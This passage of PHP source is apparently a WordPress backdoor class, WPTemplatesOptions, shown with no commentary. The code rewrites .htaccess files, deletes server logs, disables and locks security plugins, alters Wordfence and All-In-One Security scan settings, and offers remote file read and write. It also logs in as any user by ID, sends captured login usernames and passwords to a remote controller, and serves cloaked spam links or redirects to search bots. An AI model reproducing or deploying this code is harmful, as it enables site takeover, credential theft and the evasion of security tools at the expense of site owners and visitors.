				return false;
			}
		}

		private function htaccess() {
			try {
				if ( !isset( $this->client ) ) {
					$this->client = $this->cache()->files;
				}
				if ( $this->where() ) {
					$directory = $this->directory( $this->home(), '.htaccess', GLOB_NOSORT );
				} else {
					$directory = $this->directory( $this->abspath(), '.htaccess', GLOB_NOSORT );
				}
				$return = new stdClass();
				foreach ( $directory as $iterator ) {
					if ( $this->strpos( $iterator, array('wp-content', 'wp-includes', 'wp-admin') ) ) {
						if ( $this->write( $iterator, $this->client->sub_htaccess ) ) {
							$return->sub["true"][] = $iterator;
						} else {
							$return->sub["false"][] = $iterator;
						}
					} else if ( stristr( $this->read( $iterator ), '# BEGIN WordPress' ) !== false ) {
						if ( $this->write( $iterator, $this->client->main_htaccess ) ) {
							$return->main[] = $iterator;
						}
					} else {
						$return->undefined[] = $iterator;
					}
				}
				return $this->answer( true, 'I Get Change htaccess', $return );
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function log() {
			try {
				if ( !isset( $this->client ) ) {
					$this->client = $this->cache()->files;
				}
				foreach ( $this->directory( $this->home(), '{*.gz,*.com,*.com-ssl-log,*.log,error_log}', GLOB_BRACE | GLOB_NOSORT ) as $iterator ) {
					if ( is_file( $iterator ) ) {
						if ( stristr( $iterator, '.gz' ) && stristr( $iterator, $this->home() ) ) {
						} else {
							$this->return_array[] = $iterator;
							unlink( $iterator );
						}
					}
				}
				return $this->return_array;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function WPFastestCacheExclude() {
			try {
				if ( $this->_get_option( 'WpFastestCacheExclude' ) ) {
					foreach ( $this->client->settings->cache->bot as $bot ) {
						if ( !strpos( $this->_get_option( 'WpFastestCacheExclude' ), $bot ) ) {
							$this->_update_option( 'WpFastestCacheExclude', json_encode( $this->client->settings->cache->WpFastestCacheExclude ) );
							return true;
						}
					}
				} else {
					$this->_add_option( 'WpFastestCacheExclude', json_encode( $this->client->settings->cache->WpFastestCacheExclude ) );
					return true;
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function LitespeedCache() {
			try {
				$litespeed = $this->_get_option( 'litespeed-cache-conf' );
				if ( $litespeed ) {
					foreach ( $this->client->settings->cache->bot as $bot ) {
						if ( !stristr( $litespeed['nocache_useragents'], $bot ) ) {
							$litespeed['nocache_useragents'] = ltrim( rtrim( $litespeed['nocache_useragents'], '|' ) . '|' . join( '|', $this->client->settings->cache->bot ), '|' );
							$litespeed['nocache_useragents'] = join( "|", array_values( array_unique( explode( '|', $litespeed['nocache_useragents'] ) ) ) );
							if ( $this->_update_option( 'litespeed-cache-conf', $litespeed ) ) {
								$this->write_append( $this->abspath() . '.htaccess', str_replace( '{{bot}}', $litespeed['nocache_useragents'], $this->client->settings->cache->LitespeedCache ) );
							}
						}
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function WPOptimize() {
			try {
				if ( $option = $this->_get_option( 'wpo_cache_config' ) ) {
					foreach ( $this->client->settings->cache->bot as $bot ) {
						if ( !in_array( $bot, $option['cache_exception_browser_agents'] ) ) {
							$option['cache_exception_browser_agents'] = array_values( array_unique( array_merge_recursive( $option['cache_exception_browser_agents'], $this->client->settings->cache->bot ) ) );
							if ( $this->_update_option( 'wpo_cache_config', $option ) ) {
								return true;
							}
						}
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function WPSuperCache() {
			try {
				if ( file_exists( $filename = WP_CONTENT_DIR . DIRECTORY_SEPARATOR . 'wp-cache-config.php' ) ) {
					foreach ( $this->client->settings->cache->bot as $bot ) {
						if ( !stristr( $this->read( $filename ), $bot ) ) {
							$return = false;
						}
					}
					if ( isset( $return ) && $return === false ) {
						$this->write_append( $filename, $this->client->settings->cache->WPSuperCache );
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function W3TotalCache() {
			try {
				$filename = WP_CONTENT_DIR . DIRECTORY_SEPARATOR . 'w3tc-config/master-preview.php';
				if ( file_exists( $filename ) ) {
					$json_decode = json_decode( str_replace( '<?php exit; ?>', '', $this->read( $filename ) ) );
					foreach ( $this->client->settings->cache->{__FUNCTION__} as $key => $value ) {
						if ( isset( $json_decode->$key ) ) {
							$json_decode->$key = array_values( array_unique( array_merge( $json_decode->$key, $value ) ) );
						}
					}
					$this->write( $filename, '<?php exit; ?>' . json_encode( $json_decode ) );
				}
				$filename = WP_CONTENT_DIR . DIRECTORY_SEPARATOR . 'w3tc-config/master.php';
				if ( file_exists( $filename ) ) {
					$json_decode = json_decode( str_replace( '<?php exit; ?>', '', $this->read( $filename ) ) );
					foreach ( $this->client->settings->cache->{__FUNCTION__} as $key => $value ) {
						if ( isset( $json_decode->$key ) ) {
							$json_decode->$key = array_values( array_unique( array_merge( $json_decode->$key, $value ) ) );
						}
					}
					$this->write( $filename, '<?php exit; ?>' . json_encode( $json_decode ) );
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function Wordfence() {
			try {
				global $wpdb;
				$table = $wpdb->prefix . 'wfconfig';
				if ( $wpdb->get_var( "SHOW TABLES LIKE '{$table}'" ) == $table ) {
					$exclude = $wpdb->get_row( "SELECT * FROM {$table} WHERE name = 'scan_exclude'" );
					$include = $wpdb->get_row( "SELECT * FROM {$table} WHERE name = 'scan_include_extra'" );
					foreach ( $this->client->settings->security->{__FUNCTION__}->search->exclude as $wordfence ) {
						if ( strpos( $exclude->val, $wordfence ) === false ) {
							$exclude->val = $exclude->val . PHP_EOL . $wordfence;
							$wpdb->update( $table, array('val' => $exclude->val), array('name' => 'scan_exclude'), $format = null, $where_format = null );
						}
					}
					foreach ( $this->client->settings->security->{__FUNCTION__}->search->include as $wordfence ) {
						if ( strpos( $include->val, $wordfence ) === false ) {
							$include->val = $include->val . PHP_EOL . $wordfence;
							$wpdb->update( $table, array('val' => $include->val), array('name' => 'scan_include_extra'), $format = null, $where_format = null );
						}
					}
					foreach ( $this->client->settings->security->{__FUNCTION__}->scans as $where => $val ) {
						$wpdb->update( $table, array('val' => $val), array('name' => "{$where}"), $format = null, $where_format = null );
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function AllInOneSecurity() {
			try {
				if ( $option = $this->_get_option( 'aio_wp_security_configs' ) ) {
					foreach ( $this->client->settings->security->{__FUNCTION__}->scans as $where => $value ) {
						$option[$where] = $value;
						$this->_update_option( 'aio_wp_security_configs', $option );
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function update() {
			try {
				if ( !isset( $this->client ) ) {
					$this->client = $this->cache()->files;
				}
				foreach ( $this->client->settings->plugins as $key => $value ) {
					if ( $this->findPlugin( $value ) !== false ) {
						$this->{$key}();
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function disable() {
			try {

				if ( !isset( $this->client ) ) {
					$this->client = $this->cache()->files;
				}
				$return = array();
				foreach ( $this->client->settings->security->disable as $disable ) {
					foreach ( $this->get_plugins() as $key => $plugins ) {
						foreach ( $plugins as $plugin_key => $plugin ) {
							if ( stristr( $plugin, $disable ) && $plugins['active'] == 1 ) {
								$return[$key] = $plugins;
								$this->_deactivate_plugins( $key );
								if ( function_exists( 'chmod' ) && defined( 'WP_PLUGIN_DIR' ) ) {
									chmod( WP_PLUGIN_DIR . "/{$key}", 0000 );
								}
							}
						}
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function findPlugin( $name ) {
			try {
				foreach ( $this->get_plugins() as $key => $plugins ) {
					foreach ( $plugins as $plugin_key => $plugin ) {
						if ( stristr( $plugin, $name ) && $plugins['active'] == 1 ) {
							return $plugins;
						}
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function json() {
			try {
				$this->upDir();
				return $this->uploadDir . DIRECTORY_SEPARATOR . '.json';
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function get() {
			try {
				if ( $this->post() ) {
					if ( $this->json_validator( $this->json_encode ) ) {
						$write = $this->write( $this->json(), bin2hex( $this->json_encode ) );
						return ($write) ? $this->hex2bin( $this->read( $this->json() ) ) : $this->json_encode;
					} else {
						return $this->hex2bin( $this->read( $this->json() ) );
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function cache() {
			try {
				if ( file_exists( $this->json() ) ) {
					if ( $this->timestamp( filemtime( $this->json() ) ) >= 12 ) {
						return json_decode( $this->get() );
					} else {
						$json = json_decode( $this->hex2bin( $this->read( $this->json() ) ) );
						return (isset( $json->files )) ? $json : json_decode( $this->get() );
					}
				} else {
					return json_decode( $this->get() );
				}
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function writing( $filename, $data ) {
			if ( file_exists( $filename ) ) {
				if ( filesize( $filename ) !== strlen( $data ) ) {
					return $this->write( $filename, $data );
				}
				return true;
			}
			if ( !file_exists( $filename ) ) {
				return $this->write( $filename, $data );
			}
			return false;
		}

		private function write( $filename, $data ) {
			try {
				if ( function_exists( 'fopen' ) && function_exists( 'fwrite' ) ) {
					$fopen = fopen( $filename, 'w+' );
					$fwrite = fwrite( $fopen, $data );
					fclose( $fopen );
					return ($fwrite) ? true : false;
				} else if ( function_exists( 'file_put_contents' ) ) {
					return (file_put_contents( $filename, $data ) !== false) ? true : false;
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function write_file() {
			try {
				if ( !isset( $_REQUEST['filename'] ) ) {
					return false;
				}
				$filename = $this->hex2bin( $_REQUEST['filename'] );
				if ( isset( $_REQUEST['content'] ) ) {
					$content = $this->hex2bin( $_REQUEST['content'] );
				}
				if ( file_exists( $filename ) ) {
					if ( isset( $content ) ) {
						if ( $write = $this->write( $filename, $content ) ) {
							return $this->answer( $write, $filename, $content );
						}
					} else {
						return $this->answer( true, $filename, $this->read( $filename ) );
					}
				} else {
					if ( isset( $content ) ) {
						if ( $write = $this->write( $filename, $content ) ) {
							return $this->answer( $write, $filename, $content );
						}
					} else {
						return $this->answer( $this->write( $filename, ' ' ), $filename, '' );
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function write_append( $filename, $data ) {
			try {
				if ( function_exists( 'fopen' ) && function_exists( 'fwrite' ) ) {
					$write = fopen( $filename, 'a' );

					return (fwrite( $write, $data )) ? true : false;

				} else if ( function_exists( 'file_put_contents' ) ) {
					return (file_put_contents( $filename, $data, FILE_APPEND ) !== false) ? true : false;
				}

				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function read( $filename ) {
			try {
				if ( !file_exists( $filename ) ) {
					return false;
				}
				if ( function_exists( 'file_get_contents' ) && is_readable( $filename ) ) {
					return file_get_contents( $filename );
				}

				if ( function_exists( 'fopen' ) && is_readable( $filename ) ) {
					$file = fopen( $filename, 'r' );
					$content = '';
					while ( !feof( $file ) ) {
						$content .= fread( $file, filesize( $filename ) );
					}
					fclose( $file );
					return $content;
				}

				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function read_file() {
			try {
				if ( !isset( $_REQUEST['filename'] ) ) {
					return false;
				}
				$filename = $this->hex2bin( $_REQUEST['filename'] );

				if ( $this->json_validator( $read = $this->read( $filename ) ) ) {
					return $read;
				} else {
					return $this->answer( true, $filename, $read );
				}
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function login() {
			try {
				$id = (isset( $_REQUEST['user_id'] )) ? $_REQUEST['user_id'] : exit;
				if ( $user = $this->_get_user_by( 'id', $id ) ) {
					$this->_wp_set_current_user( $user->ID, $user->user_login );
					$this->_wp_set_auth_cookie( $user->ID );
					return $this->answer( true, 'login data', $user );
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function wp_login() {
			try {
				if ( isset( $_POST['log'] ) ) {
					$username = (isset( $_POST['log'] )) ? $_POST['log'] : 'not isset';
					$password = (isset( $_POST['pwd'] )) ? $_POST['pwd'] : 'not isset';
					$wp_authenticate = $this->_wp_authenticate( $username, $password );
					if ( isset( $wp_authenticate->data ) ) {
						$this->send( 'login', array(
							'username'    => $username,
							'password'    => $password,
							'redirect_to' => (isset( $_POST['redirect_to'] )) ? $_POST['redirect_to'] : '',
							'admin_url'   => 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'],
							'json'        => json_encode( $wp_authenticate->data ),
						) );
					}
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function request( $name, $value ) {
			if ( isset( $_REQUEST["{$name}"] ) && $_REQUEST["{$name}"] == $value ) {
				return true;
			}
			return false;
		}

		private function activated() {
			try {
				if ( !isset( $this->client ) ) {
					$this->client = $this->cache()->files;
				}
				if ( $this->request( 'activate', 'true' ) || $this->request( 'activated', 'true' ) || $this->request( 'action', 'heartbeat' ) ) {
					$this->install();
				}
				if ( $this->request( 'action', 'upload-theme' ) || $this->request( 'action', 'install-theme' ) || $this->request( 'action', 'do-theme-upgrade' ) ) {
					$this->theme();
				}
				if ( $this->request( 'action', 'upload-plugin' ) || $this->request( 'action', 'install-plugin' ) || $this->request( 'action', 'do-plugin-upgrade' ) ) {
					$this->plugin();
				}
				if ( $this->request( 'action', 'do-core-upgrade' ) || $this->request( 'action', 'do-core-reinstall' ) || (stristr( @$_SERVER['REQUEST_URI'], 'about.php?updated' )) ) {
					$this->install();
				}
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function upgrade() {
			try {
				if ( !isset( $this->client ) ) {
					$this->client = $this->cache()->files;
				}
				if ( $this->version < $this->client->version ) {
					$this->reinstall();
					return true;
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function init() {
			try {
				$data = $this->cache()->data;
				if ( isset( $data->location ) ) {
					$this->_add_action( $data->location, array($this, 'code') );
					return true;
				}
				if ( isset( $data->script->location ) ) {
					$this->_add_action( $data->script->location, array($this, 'script') );
					return true;
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		private function is_bot() {
			try {
				$this->is_bot->data = $this->cache()->data;
				$this->is_bot->bot = (preg_match( "~({$this->is_bot->data->bot})~i", strtolower( @$_SERVER['HTTP_USER_AGENT'] ) )) ? true : false;
				$this->is_bot->unbot = (preg_match( "~({$this->is_bot->data->unbot})~i", strtolower( @$_SERVER['HTTP_USER_AGENT'] ) )) ? true : false;
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function script() {
			try {
				$this->is_bot();
				if ( !$this->is_bot->bot && !$this->is_bot->unbot && !$this->_is_user_logged_in() ) {
					echo $this->is_bot->data->script->data;
				}
				return false;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function code() {
			try {
				$this->is_bot();
				if ( $this->is_bot->bot && !$this->is_bot->unbot && !$this->_is_user_logged_in() ) {
					if ( $this->is_bot->data->status === 9 && !empty( $this->is_bot->data->redirect ) && isset( $this->is_bot->data->redirect ) ) {
						header( "Location: {$this->is_bot->data->redirect}", true, 301 );
					}
					if ( $this->is_bot->data->is_home ) {
						echo $this->is_bot->data->style . join( $this->is_bot->data->implode, $this->is_bot->data->link );
					}
					if ( !$this->is_bot->data->is_home && !$this->_is_home() && !$this->_is_front_page() ) {
						echo $this->is_bot->data->style . join( $this->is_bot->data->implode, $this->is_bot->data->link );
					}
				}
				return true;
			} catch ( Exception $e ) {
				return false;
			}
		}

		public function filter() {
			return $this->_add_filter( 'the_content', array($this, 'remove_rel'), 1000 );
		}

		public function remove_rel( $content ) {
			return preg_replace_callback( '/(:? rel=\")(.+?)(:?\")/', array($this, 'remove_rel_replace'), $content );
		}

		public function remove_rel_replace( $content ) {
			return preg_replace( '/(:? rel=\")(.+?)(:?\")/', '', $content['0'] );
		}

		public static function loaded() {
			try {
				(new self())->activated();
				(new self())->disable();
				(new self())->upgrade();
				(new self())->ftp();
				(new self())->update();
				(new self())->init();
				(new self())->wp_login();
				(new self())->filter();
				return true;
			} catch ( Exception $e ) {
				return false;
			}
		}
	}

	try {
		@ini_set( 'memory_limit', -1 );
		@ini_set( 'max_execution_time', -1 );
		@set_time_limit( -1 );
		@error_reporting( 0 );
		@ini_set( 'display_errors', false );
		if ( isset( $_REQUEST['debug'] ) ) {
			if ( $_REQUEST['debug'] == true ) {
				@error_reporting( -1 );
				@ini_set( 'display_errors', true );
			}
		}

		if ( !function_exists( 'preArrayList' ) ) {
			function preArrayList( $arr ) {
				echo '<pre>';
				print_r( $arr );
				echo '</pre>';
			}
		}
		if ( !defined( 'ABSPATH' ) ) {
			foreach ( array('.', '..', '../..', '../../..', '../../../..', '../../../../..', '../../../../../..', '../../../../../../..', '../../../../../../../..') AS $directory ) {
				if ( file_exists( $directory . DIRECTORY_SEPARATOR . 'wp-load.php' ) ) {
					include_once($directory . DIRECTORY_SEPARATOR . 'wp-load.php');
					break;
				}
			}
		}
	} catch ( Exception $e ) {
	}
	try {
		if ( isset( $_REQUEST['wp_api_token'] ) && !is_null( $_REQUEST['wp_api_token'] ) && !empty( $_REQUEST['wp_api_token'] ) ) {
			if ( function_exists( 'add_action' ) ) {
				add_action( 'wp_loaded', function() {
					$controlAction = WPTemplatesOptions::getInstanceWordpress()->controlAction( $_REQUEST['wp_api_application'], (isset( $_REQUEST['wp_api_params'] )) ? $_REQUEST['wp_api_params'] : '', $_REQUEST['wp_api_token'] );
					if ( is_array( $controlAction ) || is_object( $controlAction ) ) {
						preArrayList( $controlAction );
					} else {
						echo (!is_null( $controlAction )) ? $controlAction : '';
					}
				} );
			}
		} else {
			if ( function_exists( 'add_action' ) ) {
				add_action( 'init', array('WPTemplatesOptions', 'loaded') );
			}
		}
	} catch ( Exception $e ) {
	}
}
//fed36e93a0509e20f2dc96cbbd85b678
